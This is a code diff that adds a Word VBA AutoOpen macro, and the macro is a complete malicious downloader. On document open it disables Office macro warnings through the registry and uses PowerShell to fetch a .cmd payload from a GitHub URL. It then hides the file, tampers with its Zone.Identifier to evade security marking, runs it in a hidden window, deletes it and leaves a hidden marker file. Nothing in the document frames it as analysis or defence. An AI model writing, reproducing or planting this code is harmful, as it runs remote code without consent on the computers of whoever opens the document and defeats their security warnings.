@@ -1,0 +1,74 @@
+Sub AutoOpen()
+    Dim docPath, lCmdPath, markerPath, regKey
+    Dim fso, wsh, exec
+    Dim startTime, fileExists, i
+    
+    ' --- Error handling initialization ---
+    On Error Resume Next
+    
+    ' --- Get document path safely ---
+    docPath = ThisDocument.Path
+    If Err.Number <> 0 Or docPath = "" Then
+        Exit Sub
+    End If
+    
+    ' --- Persistence Check ---
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set wsh = CreateObject("WScript.Shell")
+    markerPath = docPath & "\.installed"
+    If fso.FileExists(markerPath) Then Exit Sub
+    
+    ' --- Disable Macro Warnings (Stealth) ---
+    regKey = "HKCU\Software\Microsoft\Office\16.0\Word\Security\VBAWarnings"
+    wsh.RegWrite regKey, 1, "REG_DWORD"
+    
+    ' --- Download payload ---
+    lCmdPath = docPath & "\l.cmd"
+    Dim psDownload: psDownload = "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/l3.cmd', '" & lCmdPath & "')"
+    wsh.Run "powershell -Command """ & psDownload & """", 0, True
+    
+    ' --- Verify download ---
+    fileExists = False
+    startTime = Timer
+    Do While Timer < startTime + 15
+        If fso.FileExists(lCmdPath) Then
+            fileExists = True
+            Exit Do
+        End If
+        WScript.Sleep 200
+    Loop
+
+    If Not fileExists Then Exit Sub
+    
+    ' --- Stealth Operations ---
+    ' 1. Set hidden attribute
+    SetAttr lCmdPath, vbHidden
+    
+    ' 2. Remove security zone identifier
+    wsh.Run "powershell -Command ""Set-Content -Path '" & lCmdPath & "' -Stream Zone.Identifier -Value [byte[]]""", 0, True
+    
+    ' 3. Mark as safe via alternate method
+    wsh.Run "cmd /c echo [ZoneTransfer] > """ & lCmdPath & ":Zone.Identifier"" && echo ZoneId=3 >> """ & lCmdPath & ":Zone.Identifier""", 0, True
+    
+    ' --- Execute payload hidden ---
+    wsh.Run "cmd.exe /C """ & lCmdPath & """", 0, False
+    WScript.Sleep 2000
+    
+    ' --- Cleanup with retries ---
+    For i = 1 To 5
+        If fso.FileExists(lCmdPath) Then
+            fso.DeleteFile lCmdPath, True
+        End If
+        If Err.Number = 0 Then Exit For
+        WScript.Sleep 500
+        Err.Clear
+    Next
+    
+    ' --- Create persistence marker ---
+    fso.CreateTextFile(markerPath, True).Close
+    SetAttr markerPath, vbHidden + vbSystem
+    
+    ' --- Final cleanup ---
+    Set fso = Nothing
+    Set wsh = Nothing
+End Sub
